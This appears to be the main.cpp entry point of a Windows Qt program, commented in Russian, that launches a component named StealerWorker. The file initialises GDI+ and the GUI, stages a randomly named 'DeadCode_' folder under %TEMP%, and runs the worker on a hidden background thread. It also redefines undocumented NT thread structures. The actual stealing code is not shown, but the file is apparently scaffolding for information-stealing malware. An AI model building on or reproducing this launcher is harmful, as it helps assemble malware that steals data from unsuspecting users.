#include <winsock2.h> // Сетевые функции Windows, включается первым
#define WIN32_LEAN_AND_MEAN // Исключить устаревшие заголовки
#define GDIPLUS_NO_AUTOINIT // Отключить автоматическую инициализацию GDI+
#include <windows.h>
#include <ntstatus.h>
#include <gdiplus.h>
#include <iostream>
#include <mutex>
#include <QApplication>
#include <QThread>
#include <QDir>
#include <QString>

#include "mainwindow.h"
#include "ui_mainwindow.h"
#include "stealerworker.h"

// Определение NT_SUCCESS, если он отсутствует
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

// Переопределение типов для совместимости
typedef enum _THREADINFOCLASS {
    ThreadBasicInformation = 0,
    ThreadQuerySetWin32StartAddress = 9
} THREADINFOCLASS;

typedef struct _THREAD_BASIC_INFORMATION {
    NTSTATUS ExitStatus;
    PVOID TebBaseAddress;
    ULONG_PTR ClientId;
    ULONG_PTR AffinityMask;
    LONG Priority;
    LONG BasePriority;
} THREAD_BASIC_INFORMATION, *PTHREAD_BASIC_INFORMATION;

// Глобальные переменные
std::mutex g_mutex;
MainWindow* g_mainWindow = nullptr;
Gdiplus::GdiplusStartupInput gdiplusStartupInput;
ULONG_PTR gdiplusToken;

int main(int argc, char *argv[]) {
    // Инициализация GDI+
    Gdiplus::Status gdiStatus = Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr);
    if (gdiStatus != Gdiplus::Ok) {
        std::cerr << "GDI+ initialization failed with status: " << static_cast<int>(gdiStatus) << std::endl;
        return -1;
    }

    // Инициализация QApplication
    QApplication app(argc, argv);

    // Создание главного окна
    MainWindow w;
    g_mainWindow = &w;
    w.show();

    // Создание временной директории для StealerWorker
    QString tempDirBase = QString::fromStdString(getenv("TEMP") ? getenv("TEMP") : "C:\\Temp");
    QString tempDir = tempDirBase + "\\DeadCode_" + w.generateRandomString(8);
    QDir dir(tempDir);
    if (!dir.exists() && !dir.mkpath(tempDir)) {
        std::cerr << "Failed to create temporary directory: " << tempDir.toStdString() << std::endl;
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return -1;
    }

    // Настройка StealerWorker в отдельном потоке
    StealerWorker* worker = new StealerWorker(&w, tempDir);
    QThread* thread = new QThread;
    worker->moveToThread(thread);

    // Подключение сигналов и слотов
    QObject::connect(thread, &QThread::started, worker, &StealerWorker::process);
    QObject::connect(worker, &StealerWorker::finished, thread, &QThread::quit);
    QObject::connect(worker, &StealerWorker::finished, worker, &StealerWorker::deleteLater);
    QObject::connect(thread, &QThread::finished, thread, &QThread::deleteLater);

    // Запуск потока
    thread->start();

    // Запуск тестов
    w.runTests();

    // Запуск главного цикла приложения
    int result = app.exec();

    // Очистка
    g_mainWindow = nullptr;
    Gdiplus::GdiplusShutdown(gdiplusToken);

    return result;
}